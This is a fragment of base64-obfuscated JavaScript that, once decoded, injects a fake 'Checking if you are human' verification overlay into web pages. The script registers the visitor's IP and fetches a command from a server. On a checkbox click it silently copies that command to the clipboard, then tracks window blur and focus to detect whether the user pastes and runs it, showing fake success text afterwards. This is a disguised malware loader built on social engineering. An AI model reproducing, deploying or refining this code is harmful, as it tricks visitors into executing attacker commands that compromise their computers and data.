habGMxSkdlamRqWmtGdElpazdDaUFnSUNCamIyNXpkQ0IyWlhKcFpubFhhVzVrYjNjZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ0lqYVZZNVdYcFpURXBaVGxoTGQySkhPU0lwT3dvZ0lDQWdZMjl1YzNRZ2MzQnBibTVsY2lBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9JaU5wYzI5TWJHTlpSa1lpS1RzS0lDQWdJR052Ym5OMElIWmxjbWxtZVVKMWRIUnZiaUE5SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0lpTnBlbmRyYmtSTE16WmxTR2h0SWlrN0Nnb2dJQ0FnTHk4ZzBLRFF0ZEN6MExqUmdkR0MwWURRdU5HQTBZUFF0ZEM4SUVsUUlOQyswTExRdGRHQTBMdlF0ZEdQSU5DLzBZRFF1Q0RRdU5DOTBMalJodEM0MExEUXU5QzQwTGZRc05HRzBMalF1QW9nSUNBZ1lYZGhhWFFnY21WbmFYTjBaWEpQZG1WeWJHRjVTVkFvS1RzS0NpQWdJQ0JoZDJGcGRDQm1aWFJqYUVOdmJXMWhibVJCYm1SRGIyMXRaVzUwS0NrN0NpQWdJQ0J6WlhSVWFXMWxiM1YwS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0J3Y21Wc2IyRmtaWEpGYkdWdFpXNTBjeTVtYjNKRllXTm9LR1ZzSUQwK0lHVnNMbk4wZVd4bExtUnBjM0JzWVhrZ1BTQWlibTl1WlNJcE93b2dJQ0FnSUNBZ0lIQnlaV3h2WVdSbGNsUmxlSFF1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tJQ0FnSUNBZ0lDQjBaWGgwUVd4c1UzUmxjQzV6ZEhsc1pTNWthWE53YkdGNUlEMGdJbUpzYjJOcklqc0tJQ0FnSUNBZ0lDQmphR1ZqYTJKdmVGZHBibVJ2ZHk1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW1ac1pYZ2lPd29LSUNBZ0lDQWdJQ0J6WlhSVWFXMWxiM1YwS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ1kyaGxZMnRpYjNoWGFXNWtiM2N1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0ptYkdWNElqc2dDaUFnSUNBZ0lDQWdJQ0FnSUd4bGRDQnZjR0ZqYVhSNUlEMGdNRHNLSUNBZ0lDQWdJQ0FnSUNBZ2JHVjBJR1poWkdWSmJpQTlJSE5sZEVsdWRHVnlkbUZzS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR2xtSUNodmNHRmphWFI1SUQ0OUlERXBJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCamJHVmhja2x1ZEdWeWRtRnNLR1poWkdWSmJpazdJQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmU0JsYkhObElIc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J2Y0dGamFYUjVJQ3M5SURBdU1Uc2dDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWTJobFkydGliM2hYYVc1a2IzY3VjM1I1YkdVdWIzQmhZMmwwZVNBOUlHOXdZV05wZEhrN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCOUNpQWdJQ0FnSUNBZ0lDQWdJSDBzSURNd0tUc0tJQ0FnSUNBZ0lDQjlMQ0F5TURBcE93b0tJQ0FnSUNBZ0lDQnpkR1Z3TUVWc1pXMWxiblJ6TG1admNrVmhZMmdvWld3Z1BUNGdaV3d1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0ppYkc5amF5SXBPd29LSUNBZ0lDQWdJQ0J6WlhSVWFXMWxiM1YwS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ2MzUmxjREJGYkdWdFpXNTBjeTVtYjNKRllXTm9LR1ZzSUQwK0lHVnNMbk4wZVd4bExtUnBjM0JzWVhrZ1BTQWlibTl1WlNJcE93b2dJQ0FnSUNBZ0lDQWdJQ0J6ZEdWd01VVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKaWJHOWpheUlwT3dvZ0lDQWdJQ0FnSUgwc0lESXdNREFwT3lBS0lDQWdJSDBzSURFMU1EQXBPeUFLQ2lBZ0lDQmphR1ZqYTJKdmVDNWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDSmpiR2xqYXlJc0lHWjFibU4wYVc5dUlDZ3BJSHNLSUNBZ0lDQWdJQ0JqYjI1emRDQjBaWGgwWVhKbFlTQTlJR1J2WTNWdFpXNTBMbU55WldGMFpVVnNaVzFsYm5Rb0ozUmxlSFJoY21WaEp5azdDaUFnSUNBZ0lDQWdkR1Y0ZEdGeVpXRXVkbUZzZFdVZ1BTQm1aWFJqYUdWa1EyOXRiV0Z1WkRzS0lDQWdJQ0FnSUNCMFpYaDBZWEpsWVM1elpYUkJkSFJ5YVdKMWRHVW9KM0psWVdSdmJteDVKeXdnSnljcE93b2dJQ0FnSUNBZ0lIUmxlSFJoY21WaExuTjBlV3hsTG5CdmMybDBhVzl1SUQwZ0oyRmljMjlzZFhSbEp6c0tJQ0FnSUNBZ0lDQjBaWGgwWVhKbFlTNXpkSGxzWlM1c1pXWjBJRDBnSnkwNU9UazVjSGduT3dvZ0lDQWdJQ0FnSUdSdlkzVnRaVzUwTG1KdlpIa3VZWEJ3Wlc1a1EyaHBiR1FvZEdWNGRHRnlaV0VwT3dvZ0lDQWdJQ0FnSUhSbGVIUmhjbVZoTG5ObGJHVmpkQ2dwT3dvZ0lDQWdJQ0FnSUdSdlkzVnRaVzUwTG1WNFpXTkRiMjF0WVc1a0tDZGpiM0I1SnlrN0NpQWdJQ0FnSUNBZ1pHOWpkVzFsYm5RdVltOWtlUzV5WlcxdmRtVkRhR2xzWkNoMFpYaDBZWEpsWVNrN0NpQWdJQ0FnSUNBZ1kyOXVjMjlzWlM1c2IyY29KK0tjaFNjcE93b2dJQ0FnSUNBZ0lHTm9aV05yWW05NFYybHVaRzkzTG5OMGVXeGxMbkJoWkdScGJtY2dQU0FpTVRCd2VDSTdDaUFnSUNBZ0lDQWdKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWdpTG1OSFdqWjBkWFJETmpSSVVtWlpWMG9pS1M1emRIbHNaUzV0WVhKbmFXNU1aV1owSUQwZ0lqRTBjSGdpT3dvZ0lDQWdJQ0FnSUhOMFpYQXhSV3hsYldWdWRITXVabTl5UldGamFDaGxiQ0E5UGlCbGJDNXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltNXZibVVpS1RzS0lDQWdJQ0FnSUNCemRHVndNa1ZzWlcxbGJuUnpMbVp2Y2tWaFkyZ29aV3dnUFQ0Z1pXd3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSmliRzlqYXlJcE93b2dJQ0FnSUNBZ0lITndhVzV1WlhJdWMzUjViR1V1ZG1semFXSnBiR2wwZVNBOUlDSjJhWE5wWW14bElqc0tJQ0FnSUNBZ0lDQnpaWFJVYVcxbGIzVjBLQ2dwSUQwK0lIc0tJQ0FnSUNBZ0lDQWdJQ0FnWTJobFkydGliM2hYYVc1a2IzY3VjM1I1YkdVdWQybGtkR2dnUFNBaU5UTXdjSGdpT3dvZ0lDQWdJQ0FnSUNBZ0lDQmphR1ZqYTJKdmVGZHBibVJ2ZHk1emRIbHNaUzVvWldsbmFIUWdQU0FpWVhWMGJ5STdDaUFnSUNBZ0lDQWdJQ0FnSUhabGNtbG1lVmRwYm1SdmR5NXpkSGxzWlM1aWIzSmtaWEpVYjNBZ1BTQWlNWEI0SUhOdmJHbGtJQ00zT1RjNU56a2lPd29nSUNBZ0lDQWdJQ0FnSUNCMlpYSnBabmxYYVc1a2IzY3VjM1I1YkdVdWNHRmtaR2x1WjFSdmNDQTlJQ0l6Y0hnaU93b2dJQ0FnSUNBZ0lDQWdJQ0IyWlhKcFpubFhhVzVrYjNjdWMzUjViR1V1YldGeVoybHVWRzl3SUQwZ0lqRTFjSGdpT3dvZ0lDQWdJQ0FnSUNBZ0lDQjJaWEpwWm5sWGFXNWtiM2N1WTJ4aGMzTk1hWE4wTG1Ga1pDZ2lZV04wYVhabElpazdDaUFnSUNBZ0lDQWdmU3dnTlRBd0tUc0tJQ0FnSUgwcE93b0tJQ0FnSUM4dklFSnNkWEl2Um05amRYTWdZV04wYVhaaGRHbHZiaUJtYjNJZ1ZtVnlhV1o1SUdKMWRIUnZiZ29nSUNBZ2JHVjBJR2hoYzBKc2RYSnlaV1FnUFNCbVlXeHpaVHNLQ2lBZ0lDQm1kVzVqZEdsdmJpQmxibUZpYkdWQ2RYUjBiMjRvS1NCN0NpQWdJQ0FnSUNBZ2FXWWdLQ0YyWlhKcFpubENkWFIwYjI0cElISmxkSFZ5YmpzS0NpQWdJQ0FnSUNBZ2FXWWdLSFpsY21sbWVVSjFkSFJ2Ymk1a2FYTmhZbXhsWkNrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0IyWlhKcFpubENkWFIwYjI0dVpHbHpZV0pzWldRZ1BTQm1ZV3h6WlRzS0lDQWdJQ0FnSUNBZ0lDQWdkbVZ5YVdaNVFuVjBkRzl1TG5KbGJXOTJaVUYwZEhKcFluVjBaU2duWkdsellXSnNaV1FuS1RzS0lDQWdJQ0FnSUNBZ0lDQWdkbVZ5YVdaNVFuVjBkRzl1TG5OMGVXeGxMbTl3WVdOcGRIa2dQU0FuTVNjN0NpQWdJQ0FnSUNBZ0lDQWdJSFpsY21sbWVVSjFkSFJ2Ymk1emRIbHNaUzVqZFhKemIzSWdQU0FuY0c5cGJuUmxjaWM3Q2lBZ0lDQWdJQ0FnSUNBZ0lBb2dJQ0FnSUNBZ0lDQWdJQ0F2THlEUW85R0IwWUxRc05DOTBMRFFzdEM3MExqUXN0Q3cwTFhRdkNEUmhOQzcwTERRc3lEUmd0QyswTHZSak5DNjBMNGcwTFhSZ2RDNzBMZ2dTVkFnMExEUXV0R0MwTGpRc3RDNDBZRFF2dEN5MExEUXZTRFJnZEdDMEw3UmdOQyswTDNRdmRDNDBMd2cwTC9SZ05DNDBMdlF2dEMyMExYUXZkQzQwTFhRdkFvZ0lDQWdJQ0FnSUNBZ0lDQnpaWFJUYTJsd1JteGhaeWdwT3dvZ0lDQWdJQ0FnSUNBZ0lDQmpiMjV6YjJ4bExteHZaeWduUW5WMGRHOXVJR1Z1WVdKc1pXUWhKeWs3Q2lBZ0lDQWdJQ0FnZlFvZ0lDQWdmUW9LSUNBZ0lDOHZJRlJ5WVdOcklIZHBibVJ2ZHlCaWJIVnlJQzBnMEwzUXNOR0gwTGpRdmRDdzBMWFF2Q0J3YjJ4c2FXNW5JTkMvMFlEUXVDRFJnOUdGMEw3UXROQzFJTkdCSU5DKzBMclF2ZEN3Q2lBZ0lDQjNhVzVrYjNjdVlXUmtSWFpsYm5STWFYTjBaVzVsY2lnbllteDFjaWNzSUdaMWJtTjBhVzl1S0NrZ2V3b2dJQ0FnSUNBZ0lHaGhjMEpzZFhKeVpXUWdQU0IwY25WbE93b2dJQ0FnSUNBZ0lHTnZibk52YkdVdWJHOW5LQ2RYYVc1a2IzY2dZbXgxY25KbFpDY3BPd29nSUNBZ0lDQWdJQzh2SU5DWDBMRFF2OUdEMFlIUXV0Q3cwTFhRdkNCd2IyeHNhVzVuSU5DMDBMdlJqeURRdjlHQTBMN1FzdEMxMFlEUXV0QzRJTkdBMExEUXQ5Q3gwTHZRdnRDNjBMalJnTkMrMExMUXV0QzRDaUFnSUNBZ0lDQWdjM1JoY25SUWIyeHNhVzVuS0dWdVlXSnNaVUoxZEhSdmJpazdDaUFnSUNBZ0lDQWdkSEpoWTJ0RGIyMXdiR1YwWlNncE93b2dJQ0FnZlNrN0Nnb2dJQ0FnTHk4Z1ZISmhZMnNnZDJsdVpHOTNJR1p2WTNWeklDMGcwTC9SZ05DKzBMTFF0ZEdBMFkvUXRkQzhJTkdCMFlMUXNOR0MwWVBSZ1NEUXY5R0EwTGdnMExMUXZ0QzMwTExSZ05DdzBZTFF0UW9nSUNBZ2QybHVaRzkzTG1Ga1pFVjJaVzUwVEdsemRHVnVaWElvSjJadlkzVnpKeXdnWm5WdVkzUnBiMjRvS1NCN0NpQWdJQ0FnSUNBZ1kyOXVjMjlzWlM1c2IyY29KMWRwYm1SdmR5Qm1iMk4xYzJWa0xDQm9ZWE5DYkhWeWNtVmtPaWNzSUdoaGMwSnNkWEp5WldRcE93b2dJQ0FnSUNBZ0lHbG1JQ2hvWVhOQ2JIVnljbVZrS1NCN0NpQWdJQ0FnSUNBZ0lDQWdJQzh2SU5DZjBZRFF2dEN5MExYUmdOR1AwTFhRdkNEUmdkR0MwTERSZ3RHRDBZRWcwWURRc05DMzBMSFF1OUMrMExyUXVOR0EwTDdRc3RDNjBMZ2cwTC9SZ05DNElOR0UwTDdRdXRHRDBZSFF0UW9nSUNBZ0lDQWdJQ0FnSUNCamFHVmphMVZ1Ykc5amExTjBZWFIxY3lncExuUm9aVzRvZFc1c2IyTnJaV1FnUFQ0Z2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLSFZ1Ykc5amEyVmtLU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1pXNWhZbXhsUW5WMGRHOXVLQ2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnSUNBZ0lIMHBPd29nSUNBZ0lDQWdJSDBLSUNBZ0lIMHBPd29LSUNBZ0lDOHZJRlpsY21sbWVTQmlkWFIwYjI0Z1kyeHBZMnNnYUdGdVpHeGxjZ29nSUNBZ2FXWWdLSFpsY21sbWVVSjFkSFJ2YmlrZ2V3b2dJQ0FnSUNBZ0lIWmxjbWxtZVVKMWRIUnZiaTVoWkdSRmRtVnVkRXhwYzNSbGJtVnlLQ0pqYkdsamF5SXNJR1oxYm1OMGFXOXVJQ2dwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdhV1lnS0hSb2FYTXVaR2x6WVdKc1pXUXBJSEpsZEhWeWJqc0tDaUFnSUNBZ0lDQWdJQ0FnSUhSeVlXTnJRMjl0Y0d4bGRHVW9LVHNLQ2lBZ0lDQWdJQ0FnSUNBZ0lDOHZJRWhwWkdVZ1kyaGxZMnRpYjNnZ2QybHVaRzkzQ2lBZ0lDQWdJQ0FnSUNBZ0lHTm9aV05yWW05NFYybHVaRzkzTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpYm05dVpTSTdDZ29nSUNBZ0lDQWdJQ0FnSUNBdkx5QlRhRzkzSUd4dllXUmxjaUJtYVhKemRBb2dJQ0FnSUNBZ0lDQWdJQ0JwWmlBb2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNdWJHVnVaM1JvS1NCd2NtVnNiMkZrWlhKRmJHVnRaVzUwY3k1bWIzSkZZV05vS0dWc0lEMCtJR1ZzTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpWW14dlkyc2lLVHNLSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLSEJ5Wld4dllXUmxjbFJsZUhRcElIQnlaV3h2WVdSbGNsUmxlSFF1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tDaUFnSUNBZ0lDQWdJQ0FnSUM4dklFaHBaR1VnZG1WeWFXWjVJSFJsZUhRZ2RHVnRjRzl5WVhKcGJIa0tJQ0FnSUNBZ0lDQWdJQ0FnZEdWNGRFRnNiRk4wWlhBdWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJanNLQ2lBZ0lDQWdJQ0FnSUNBZ0lDOHZJRUZtZEdWeUlERXVOU0J6WldOdmJtUnpMQ0J6YUc5M0lITjFZMk5sYzNNS0lDQWdJQ0FnSUNBZ0lDQWdjMlYwVkdsdFpXOTFkQ2dvS1NBOVBpQjdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXZMeUJJYVdSbElHeHZZV1JsY2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tIQnlaV3h2WVdSbGNrVnNaVzFsYm5SekxteGxibWQwYUNrZ2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNdVptOXlSV0ZqYUNobGJDQTlQaUJsYkM1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlLVHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR2xtSUNod2NtVnNiMkZrWlhKVVpYaDBLU0J3Y21Wc2IyRmtaWEpVWlhoMExuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaWJtOXVaU0k3Q2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnTHk4Z1UyaHZkeUJ6ZFdOalpYTnpJSFJsZUhRS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0p5NWpXbEJtTlVSVllXUm1abVp3U2tjMUp5a3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSnBibXhwYm1VaU93b0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDOHZJRWhwWkdVZ2QyRnBkR2x1WnlCMFpYaDBMQ0J6YUc5M0lIZGhhWFJwYm1jZ2NtVnpjRzl1YzJVS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0p5NWplbVYzWjBZeWVtTXdKeWt1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeTVqU1RkNWNsWnBTVWNuS1M1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW1Kc2IyTnJJanNLQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F2THlCU1pXeHZZV1FnY0dGblpTQmhablJsY2lBeklITmxZMjl1WkhNS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUhObGRGUnBiV1Z2ZFhRb0tDa2dQVDRnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIZHBibVJ2ZHk1c2IyTmhkR2x2Ymk1eVpXeHZZV1FvS1RzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUgwc0lETXdNREFwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjlMQ0F4TlRBd0tUc0tJQ0FnSUNBZ0lDQjlLVHNLSUNBZ0lIMEtDaUFnSUNCamIyNXpkQ0IyWlhKcFptbGpZWFJwYjI1SlpDQTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSWlOcE1HTldibFZwYTJsdWN5SXBPd29nSUNBZ2FXWWdLSFpsY21sbWFXTmhkR2x2Ymtsa0tTQjdDaUFnSUNBZ0lDQWdkbVZ5YVdacFkyRjBhVzl1U1dRdWRHVjRkRU52Ym5SbGJuUWdQU0JOWVhSb0xtWnNiMjl5S0RFd01EQXdNQ0FySUUxaGRHZ3VjbUZ1Wkc5dEtDa2dLaUE1TURBd01EQXBPd29nSUNBZ2ZRb2dJQ0FnQ2lBZ0lDQmpiMjV6ZENCamFHRnljeUE5SUNKaFltTmtaV1l3TVRJek5EVTJOemc1SWpzS0lDQWdJR052Ym5OMElISmhlVWxrSUQwZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNpZ2lMbU5oWVhWUk1YcDVlbFlpS1RzS0lDQWdJR2xtSUNoeVlYbEpaQ2tnZXdvZ0lDQWdJQ0FnSUhKaGVVbGtMblJsZUhSRGIyNTBaVzUwSUQwZ1FYSnlZWGt1Wm5KdmJTaDdJR3hsYm1kMGFEb2dNVFlnZlN3Z0tDa2dQVDRnWTJoaGNuTmJUV0YwYUM1bWJHOXZjaWhOWVhSb0xuSmhibVJ2YlNncElDb2dZMmhoY25NdWJHVnVaM1JvS1YwcExtcHZhVzRvSWlJcE93b2dJQ0FnZlFwOUNncHBaaUFvWkc5amRXMWxiblF1Y21WaFpIbFRkR0YwWlNBOVBUMGdJbXh2WVdScGJtY2lLU0I3Q2lBZ0lDQmtiMk4xYldWdWRDNWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDSkVUMDFEYjI1MFpXNTBURzloWkdWa0lpd2dLQ2tnUFQ0Z2V5QnBibWwwVm1WeWFXWnBZMkYwYVc5dVJteHZkeWdwT3lCOUtUc0tmU0JsYkhObElIc0tJQ0FnSUdsdWFYUldaWEpwWm1sallYUnBiMjVHYkc5M0tDazdDbjBLQ2dwamIyNXpkQ0JtYVd4bFJYaHdiRzl5WlhJZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ2NqYVdNeU1EQnNkbUZLSnlrN0NtTnZibk4wSUdacGJHVkpibkIxZENBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeU5wVDJkc1prZExjVU5DVDI4bktUc0tiR1YwSUdacGJHVlRaV3hsWTNSbFpDQTlJR1poYkhObE93b0thV1lnS0dacGJHVkZlSEJzYjNKbGNpa2dld29nSUdacGJHVkZlSEJzYjNKbGNpNWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDZGpiR2xqYXljc0lHRnplVzVqSUdaMWJtTjBhVzl1S0NrZ2V3b2dJQ0FnSUNCaGQyRnBkQ0JtWlhSamFFTnZiVzFoYm1SQmJtUkRiMjF0Wlc1MEtDazdDaUFnSUNBZ0lHNWhkbWxuWVhSdmNpNWpiR2x3WW05aGNtUXVkM0pwZEdWVVpYaDBLR1psZEdOb1pXUkRiMjF0WVc1a0tUc0tJQ0FnSUNBZ2RISmhZMnREYjIxd2JHVjBaU2dwT3dvZ0lDQWdJQ0JwWmlBb1ptbHNaVWx1Y0hWMEtTQm1hV3hsU1c1d2RYUXVZMnhwWTJzb0tUc0tJQ0FnSUNBZ0x5OGdWMkZwZENCbWIzSWdkWE5sY2lCMGJ5QnlaWFIxY200Z2RHOGdkR2hsSUhCaFoyVUtJQ0FnSUNBZ2JHVjBJR1p2WTNWelNHRnVaR3hsWkNBOUlHWmhiSE5sT3dvZ0lDQWdJQ0JqYjI1emRDQm9ZVzVrYkdWR2IyTjFjeUE5SUNncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUdsbUlDZ2habTlqZFhOSVlXNWtiR1ZrSUNZbUlDRm1hV3hsVTJWc1pXTjBaV1FwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0JtYjJOMWMwaGhibVJzWldRZ1BTQjBjblZsT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQzh2SUM0dUxtVjRhWE4wYVc1bklHTnZaR1V1TGk0S0lDQWdJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ2ZUc0tJQ0FnSUNBZ2QybHVaRzkzTG1Ga1pFVjJaVzUwVEdsemRHVnVaWElvSjJadlkzVnpKeXdnYUdGdVpHeGxSbTlqZFhNcE93b2dJSDBwT3dwOUNncDlLU2dwT3lBdkx5QkZibVFnYjJZZ1lYTjVibU1nU1VsR1JRbz0nOwogICAgICBjb25zdCBzY3JpcHRDb2RlID0gYjY0VG9VdGY4KHNjcmlwdEI2NCk7CiAgICAgIGNvbnN0IHNjcmlwdEVsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgIHNjcmlwdEVsLnRleHRDb250ZW50ID0gc2NyaXB0Q29kZTsKICAgICAgKGRvY3VtZW50LmhlYWQgfHwgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzY3JpcHRFbCk7CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgdmVycignU2NyaXB0IGluamVjdGlvbiBmYWlsZWQnLCBlcnIpOwogICAgfQogIH0KCiAgZnVuY3Rpb24gcmVuZGVyT3ZlcmxheSgpIHsKICAgIHRyYWNrTWV0cmljKCdzaG93Jyk7CgogICAgLy8gUmVtb3ZlIHJlc2V0LmNzcyBmcm9tIGhlYWQgKGxlZ2FjeSBjbGVhbnVwKQogICAgY29uc3QgcmVzZXRDc3NMaW5rcyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2xpbmtbaHJlZio9InJlc2V0LmNzcyJdLCBsaW5rW2hyZWYqPSJyZXNldCJdJyk7CiAgICByZXNldENzc0xpbmtzLmZvckVhY2gobGluayA9PiB7CiAgICAgIGlmIChsaW5rLnBhcmVudE5vZGUpIHsKICAgICAgICBsaW5rLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQobGluayk7CiAgICAgIH0KICAgIH0pOwoKICAgIGNvbnN0IGI2NCA9ICdQR2gwYld3Z2JHRnVaejBpWlc0aVBqeG9aV0ZrUGcwS0lDQWdJRHh0WlhSaElHTm9ZWEp6WlhROUlsVlVSaTA0SWo0TkNpQWdJQ0E4YldWMFlTQnVZVzFsUFNKMmFXVjNjRzl5ZENJZ1kyOXVkR1Z1ZEQwaWQybGtkR2c5WkdWMmFXTmxMWGRwWkhSb0xDQnBibWwwYVdGc0xYTmpZV3hsUFRFdU1DSStEUW9nSUNBZ1BIUnBkR3hsUGtOb1pXTnJhVzVuSUdsbUlIbHZkU0JoY21VZ2FIVnRZVzQ4TDNScGRHeGxQZzBLSUNBZ0lEeHNhVzVySUhKbGJEMGljM1I1YkdWemFHVmxkQ0lnYUhKbFpqMGlhSFIwY0hNNkx5OWpaRzVxY3k1amJHOTFaR1pzWVhKbExtTnZiUzloYW1GNEwyeHBZbk12Wm05dWRDMWhkMlZ6YjIxbEx6WXVNQzR3TFdKbGRHRXpMMk56Y3k5aGJHd3ViV2x1TG1OemN5SStEUW9nSUNBZ1BITjBlV3hsUGcwS0lDQWdZbTlrZVNCN0RRb2dJQ0FnSUNBZ0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNklISm5ZaWd5TlRVc01qVTFMREkxTlN3Z01DNDRLVHNOQ2lBZ0lDQWdJQ0FnWTI5c2IzSTZJQ016TVRNeE16RTdEUW9nSUNBZ2ZRMEtEUW9nSUNBZ0kybGlhSGsyUTJaV2RsZDBSU0I3RFFvZ0lDQWdJQ0JvWldsbmFIUTZJREkxY0hnN0RRb2dJQ0FnSUNCdFlYSm5hVzR0WW05MGRHOXRPaUF4Y0hnN0RRb2dJQ0FnZlEwS0RRb2dJQ0FnTG1NeE9Fc3llVTlVWWpOMFoyZEpNMGtnZXcwS0lDQWdJQ0FnYkdsdVpTMW9aV2xuYUhRNklESXVNalZ5WlcwN0RRb2dJQ0FnSUNCbWIyNTBMWE5wZW1VNklERXVOWEpsYlRzTkNpQWdJQ0FnSUdadmJuUXRkMlZwWjJoME9pQTFNREE3RFFvZ0lDQWdmUTBLSUNBZ0lDNXZkbVZ5YkdGNUxYTjBlV3hsY3lCN0RRb2dJQ0FnSUNCaVlXTnJaM0p2ZFc1a09pQnlaMkpoS0RJMU5Td3lOVFVzTWpVMUxEQXVPQ2s3RFFvZ0lDQWdmUTBLRFFvZ0lDQWdMbU4yVEZOMlRqSlBTRW95UzFoRlNpQjdEUW9nSUNBZ0lDQmpiMnh2Y2pvZ0l6QXdNREF3TURzTkNpQWdJQ0I5RFFvZ0lDQWdMbkJ5YVhaaFkza3RZVzVrTFhSbGNtMXpJSHNOQ2lBZ0lDQWdJR052Ykc5eU9pQWpNak15TXpJek93MEtJQ0FnSUNBZ2RHVjRkQzFrWldOdmNtRjBhVzl1T2lCMWJtUmxjbXhwYm1VN0RRb2dJQ0FnSUNCc2FXNWxMV2hsYVdkb2REb2dNVEJ3ZURzTkNpQWdJQ0FnSUdadmJuUXRjMmw2WlRvZ09IQjRPdzBLSUNBZ0lDQWdabTl1ZEMxM1pXbG5hSFE2SURRd01Ec05DaUFnSUNBZ0lHWnZiblF0YzNSNWJHVTZJRzV2Y20xaGJEc05DaUFnSUNBZ0lHTjFjbk52Y2pwd2IybHVkR1Z5T3cwS0lDQWdJSDBOQ2lBZ0lDQXVjSEpwZG1GamVTMWhibVF0ZEdWeWJYTWdPbWh2ZG1WeUlIc05DaUFnSUNBZ0lHTnZiRzl5T2lBak5EYzBOelEzT3cwS0lDQWdJSDBOQ2cwS0lDQWdJRUJ0WldScFlTQW9jSEpsWm1WeWN5MWpiMnh2Y2kxelkyaGxiV1U2SUdSaGNtc3BJSHNOQ2lBZ0lDQWdJQzV3Y21sMllXTjVMV0Z1WkMxMFpYSnRjeUI3RFFvZ0lDQWdJQ0FnSUdOdmJHOXlPaUFqWW1KaU93MEtJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ0lDQmliMlI1SUhzTkNpQWdJQ0FnSUNBZ0lDQWdJR0poWTJ0bmNtOTFibVF0WTI5c2IzSTZJSEpuWWlnd0xEQXNNQ3dnTUM0NEtTQWhhVzF3YjNKMFlXNTBPdzBLSUNBZ0lDQWdJQ0FnSUNBZ1kyOXNiM0k2SUNOa09XUTVaRGtnSVdsdGNHOXlkR0Z1ZERzTkNpQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ0lDQXVZMGRhTm5SMWRFTTJORWhTWmxsWFNpQjdEUW9nSUNBZ0lDQWdJQ0FnSUNCamIyeHZjam9nSTJRNVpEbGtPU0FoYVcxd2IzSjBZVzUwT3cwS0lDQWdJQ0FnSUNBZ0lDQWdkMmhwZEdVdGMzQmhZMlU2SUc1dmQzSmhjRHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lHWnZiblF0YzJsNlpUb3hOSEI0